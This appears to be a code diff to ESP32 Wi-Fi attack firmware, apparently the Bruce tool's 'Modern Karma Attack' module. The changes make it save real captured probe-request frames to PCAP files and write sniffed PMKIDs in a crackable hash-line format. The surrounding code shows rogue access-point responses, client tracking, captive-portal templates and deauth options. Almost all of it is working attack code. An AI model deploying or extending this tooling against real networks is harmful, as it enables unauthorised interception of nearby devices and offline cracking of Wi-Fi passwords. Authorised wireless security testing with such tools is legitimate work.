@@ -956,6 +956,7 @@ void processResponseQueue() {
             if (!found && activeNetworks.size() < MAX_CONCURRENT_SSIDS) {
                 ActiveNetwork net;
                 net.ssid = task.ssid;
+                net.bssid = task.bssid;
                 net.channel = task.channel;
                 net.rsn = task.rsn;
                 net.lastActivity = now;
@@ -974,6 +975,7 @@ void queueProbeResponse(const ProbeRequest &probe, const RSNInfo &rsn) {
     }
     ProbeResponseTask task;
     task.ssid = probe.ssid;
+    task.bssid = "";
     task.targetMAC = probe.mac;
     task.channel = probe.channel;
     task.rsn = rsn;
@@ -1442,9 +1444,13 @@ void handleBroadcastResponse(const String& ssid, const String& mac) {
 }
 
 void saveProbesToPCAP(FS &fs) {
-    String filename = "/ProbeData/capture_" + String(millis()) + ".pcap";
+    String filename = "/ProbeData/karma_capture_" + String(millis()) + ".pcap";
     File file = fs.open(filename, FILE_WRITE);
-    if (!file) return;
+    if (!file) {
+        Serial.println("[PCAP] Failed to create file");
+        return;
+    }
+    
     uint32_t magic = 0xa1b2c3d4;
     uint16_t version_major = 2;
     uint16_t version_minor = 4;
@@ -1452,6 +1458,7 @@ void saveProbesToPCAP(FS &fs) {
     uint32_t sigfigs = 0;
     uint32_t snaplen = 65535;
     uint32_t network = 105;
+    
     file.write((uint8_t*)&magic, 4);
     file.write((uint8_t*)&version_major, 2);
     file.write((uint8_t*)&version_minor, 2);
@@ -1459,24 +1466,43 @@ void saveProbesToPCAP(FS &fs) {
     file.write((uint8_t*)&sigfigs, 4);
     file.write((uint8_t*)&snaplen, 4);
     file.write((uint8_t*)&network, 4);
+    
     int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
+    int written = 0;
+    
     for (int i = 0; i < count; i++) {
         int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
         const ProbeRequest &probe = probeBuffer[idx];
+        
+        if (probe.frame_len == 0) continue;
+        
         uint32_t ts_sec = probe.timestamp / 1000;
         uint32_t ts_usec = (probe.timestamp % 1000) * 1000;
-        uint32_t incl_len = 60;
-        uint32_t orig_len = 60;
+        
+        if (probe.microseconds > 0) {
+            ts_sec = probe.microseconds / 1000000;
+            ts_usec = probe.microseconds % 1000000;
+        }
+        
         file.write((uint8_t*)&ts_sec, 4);
         file.write((uint8_t*)&ts_usec, 4);
-        file.write((uint8_t*)&incl_len, 4);
-        file.write((uint8_t*)&orig_len, 4);
-        uint8_t fake_frame[60] = {0};
-        fake_frame[0] = 0x40;
-        file.write(fake_frame, 60);
+        file.write((uint8_t*)&probe.frame_len, 4);
+        file.write((uint8_t*)&probe.frame_len, 4);
+        
+        file.write(probe.frame, probe.frame_len);
+        written++;
     }
+    
     file.close();
-    Serial.println("[PCAP] Capture saved to " + filename);
+    
+    if (written > 0) {
+        Serial.printf("[PCAP] Saved %d real probe requests to %s\n", written, filename.c_str());
+        displayTextLine("PCAP: " + String(written) + " packets");
+    } else {
+        Serial.println("[PCAP] No probe frames to save");
+        displayTextLine("No probe frames captured");
+    }
+    delay(1000);
 }
 
 void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
@@ -1485,6 +1511,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
     const uint8_t *frame = pkt->payload;
     uint8_t frameSubType = (frame[0] & 0xF0) >> 4;
+    
     if (frameSubType == 0x00) {
         String clientMAC = extractMAC(pkt);
         String apMAC = "";
@@ -1500,30 +1527,67 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
             Serial.println("[DEAUTH] Association blocked");
         }
     }
+    
     if (frameSubType == 0x0B || frameSubType == 0x00) {
         int pos = 24;
         while (pos + 1 < pkt->rx_ctrl.sig_len) {
             uint8_t tag = frame[pos];
             uint8_t len = frame[pos + 1];
+            
             if (tag == 0x30 && len >= 22) {
                 if (pos + 2 + len <= pkt->rx_ctrl.sig_len) {
                     String bssid = extractMAC(pkt);
-                    if (len >= 22) {
-                        char pmkid[34];
+                    
+                    if (len >= 38) {
+                        char pmkid[33];
                         for (int i = 0; i < 16; i++) {
                             sprintf(&pmkid[i*2], "%02X", frame[pos + 2 + 20 + i]);
                         }
                         pmkid[32] = '\0';
-                        Serial.printf("[PMKID] %s -> %s\n", bssid.c_str(), pmkid);
+                        
+                        String ap_name = "";
+                        for (const auto &net : activeNetworks) {
+                            char net_bssid[18];
+                            snprintf(net_bssid, sizeof(net_bssid), 
+                                    "%02X:%02X:%02X:%02X:%02X:%02X",
+                                    net.bssid[0], net.bssid[1], net.bssid[2],
+                                    net.bssid[3], net.bssid[4], net.bssid[5]);
+                            
+                            if (bssid.equals(net_bssid)) {
+                                ap_name = net.ssid;
+                                break;
+                            }
+                        }
+                        
+                        Serial.printf("[PMKID] %s (%s) -> %s\n", 
+                                    bssid.c_str(), 
+                                    ap_name.length() ? ap_name.c_str() : "Unknown",
+                                    pmkid);
+                        
                         FS *saveFs;
                         if (getFsStorage(saveFs)) {
-                            File file = saveFs->open("/ProbeData/pmkid.txt", FILE_APPEND);
+                            if (!saveFs->exists("/ProbeData")) saveFs->mkdir("/ProbeData");
+                            
+                            File file = saveFs->open("/ProbeData/pmkid_22000.txt", FILE_APPEND);
                             if (file) {
-                                file.printf("%lu,BSSID:%s,PMKID:%s\n", 
-                                          millis(), bssid.c_str(), pmkid);
+                                file.printf("%s*%s*000000000000*%s*0\n",
+                                           pmkid,
+                                           bssid.c_str(),
+                                           ap_name.length() ? ap_name.c_str() : "Unknown");
                                 file.close();
-                                pmkidCaptured++;
                             }
+                            
+                            File legacy = saveFs->open("/ProbeData/pmkid.txt", FILE_APPEND);
+                            if (legacy) {
+                                legacy.printf("%lu,%s,%s,%s\n", 
+                                             millis(), 
+                                             bssid.c_str(),
+                                             ap_name.c_str(),
+                                             pmkid);
+                                legacy.close();
+                            }
+                            
+                            pmkidCaptured++;
                         }
                     }
                 }
@@ -1532,14 +1596,19 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
             pos += 2 + len;
         }
     }
+    
     if (!isProbeRequestWithSSID(pkt)) return;
+    
     String mac = extractMAC(pkt);
     String ssid = extractSSID(pkt);
     if (mac.isEmpty()) return;
+    
     String cacheKey = mac + ":" + ssid;
     if (isMACInCache(cacheKey)) return;
     addMACToCache(cacheKey);
+    
     RSNInfo rsn = extractRSNInfo(pkt->payload, pkt->rx_ctrl.sig_len);
+    
     ProbeRequest probe;
     probe.mac = mac;
     probe.ssid = ssid;
@@ -1547,14 +1616,22 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     probe.timestamp = millis();
     probe.channel = karma_channels[channl % 14];
     probe.encryption_type = (rsn.akmSuite > 0) ? 3 : 0;
+    
+    probe.frame_len = pkt->rx_ctrl.sig_len;
+    if (probe.frame_len > 256) probe.frame_len = 256;
+    memcpy(probe.frame, pkt->payload, probe.frame_len);
+    probe.microseconds = esp_timer_get_time();
+    
     probeBuffer[probeBufferIndex] = probe;
     probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
     if (probeBufferIndex == 0) bufferWrapped = true;
+    
     totalProbes++;
     pkt_counter++;
     analyzeClientBehavior(probe);
     updateChannelActivity(probe.channel);
     updateSSIDFrequency(probe.ssid);
+    
     if (broadcastAttack.isActive()) {
         std::vector<String> recentBroadcasts = SSIDDatabase::getAllSSIDs();
         if (recentBroadcasts.size() > 10) recentBroadcasts.resize(10);
@@ -1565,6 +1642,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
             }
         }
     }
+    
     bool isRandomizedMAC = false;
     if (mac.startsWith("12:") || mac.startsWith("22:") || 
         mac.startsWith("32:") || mac.startsWith("42:")) isRandomizedMAC = true;
@@ -1576,7 +1654,9 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
             return;
         }
     }
+    
     if (broadcastAttack.isActive()) broadcastAttack.processProbeResponse(ssid, mac);
+    
     if (karmaConfig.enableAutoKarma) {
         auto it = clientBehaviors.find(probe.mac);
         if (it != clientBehaviors.end()) {
@@ -1637,6 +1717,9 @@ void clearProbes() {
     if (macRingBuffer) {
         vRingbufferDelete(macRingBuffer);
         initMACCache();
+    }
+    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
+        probeBuffer[i].frame_len = 0;
     }
 }
 
@@ -1769,6 +1852,11 @@ void karma_setup() {
     beaconsSent = 0;
     pmkidCaptured = 0;
     assocBlocked = 0;
+    
+    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
+        probeBuffer[i].frame_len = 0;
+    }
+    
     if (macRingBuffer) vRingbufferDelete(macRingBuffer);
     initMACCache();
     pendingPortals.clear();
@@ -1782,15 +1870,18 @@ void karma_setup() {
     while (!responseQueue.empty()) responseQueue.pop();
     generateRandomBSSID(currentBSSID);
     lastMACRotation = millis();
+    
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("MODERN KARMA ATTACK");
     displayTextLine("Enhanced Karma v2.0");
     delay(500);
+    
     if (!selectPortalTemplate(true)) {
         drawMainBorderWithTitle("KARMA SETUP");
         displayTextLine("Starting without portal...");
         delay(1000);
     }
+    
     drawMainBorderWithTitle("ENHANCED KARMA ATK");
     FS *Fs = nullptr;
     String FileSys = "LittleFS";
@@ -1809,12 +1900,14 @@ void karma_setup() {
     tft.setTextSize(FP);
     tft.setCursor(80, 100);
     clearProbes();
+    
     karmaConfig.enableAutoKarma = true;
     karmaConfig.enableDeauth = false;
     karmaConfig.enableSmartHop = true;
     karmaConfig.prioritizeVulnerable = true;
     karmaConfig.enableAutoPortal = templateSelected;
     karmaConfig.maxClients = MAX_CLIENT_TRACK;
+    
     attackConfig.defaultTier = TIER_HIGH;
     attackConfig.enableCloneMode = true;
     attackConfig.enableTieredAttack = true;
@@ -1826,6 +1919,7 @@ void karma_setup() {
     attackConfig.fastTierDuration = 15000;
     attackConfig.cloneDuration = 90000;
     attackConfig.maxCloneNetworks = 3;
+    
     esp_wifi_set_mode(WIFI_MODE_NULL);
     esp_wifi_start();
     esp_wifi_set_promiscuous(true);
@@ -1835,6 +1929,7 @@ void karma_setup() {
     isInitialized = true;
     vTaskDelay(1000 / portTICK_RATE_MS);
     screenNeedsRedraw = true;
+    
     for (;;) {
         if (restartKarmaAfterPortal) {
             restartKarmaAfterPortal = false;
@@ -1949,7 +2044,6 @@ void karma_setup() {
                     FS *saveFs;
                     if (getFsStorage(saveFs)) {
                         saveProbesToPCAP(*saveFs);
-                        displayTextLine("PCAP saved!");
                     } else displayTextLine("No storage!");
                     delay(1000);
                 }},
@@ -1993,7 +2087,7 @@ void karma_setup() {
                     tft.setCursor(10, y); y += 15;
                     tft.print("PMKID (WPA3):");
                     y += 5;
-                    String pmkidFile = "/ProbeData/pmkid.txt";
+                    String pmkidFile = "/ProbeData/pmkid_22000.txt";
                     if (readFs->exists(pmkidFile)) {
                         File file = readFs->open(pmkidFile, FILE_READ);
                         if (file) {
